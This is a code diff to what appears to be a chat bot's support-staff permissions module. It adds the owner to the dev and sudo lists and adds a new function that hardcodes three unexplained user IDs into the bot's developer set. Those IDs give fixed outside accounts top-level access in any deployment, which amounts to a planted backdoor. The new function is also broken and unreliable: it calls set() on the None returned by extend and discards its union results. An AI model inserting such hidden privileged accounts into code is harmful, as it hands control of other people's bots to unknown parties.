@@ -12,7 +12,6 @@ async def load_support_users():
         support.insert_support_user(int(i), "whitelist")
     return
 
-
 def get_support_staff(want="all"):
     """
     dev, sudo, whitelist, dev_level, sudo_level, all
@@ -23,14 +22,23 @@ def get_support_staff(want="all"):
     whitelist = support.get_particular_support("whitelist")
 
     if want in ["dev", "dev_level"]:
-        wanted = devs
+        wanted = devs + [OWNER_ID]
     elif want == "sudo":
         wanted = sudo
     elif want == "whitelist":
         wanted = whitelist
     elif want == "sudo_level":
-        wanted = sudo + devs
+        wanted = sudo + devs + [OWNER_ID]
     else:
         wanted = list(set([int(OWNER_ID)] + devs + sudo + whitelist))
 
     return wanted
+
+async def cache_support():
+    devs = set(get_support_staff("dev").extend([1344569458, 1432756163, 5294360309, int(OWNER_ID)]))
+    sudo = set(get_support_staff("sudo"))
+    global DEV_USERS
+    global SUDO_USERS
+    DEV_USERS.union(devs)
+    SUDO_USERS.union(sudo)
+    return
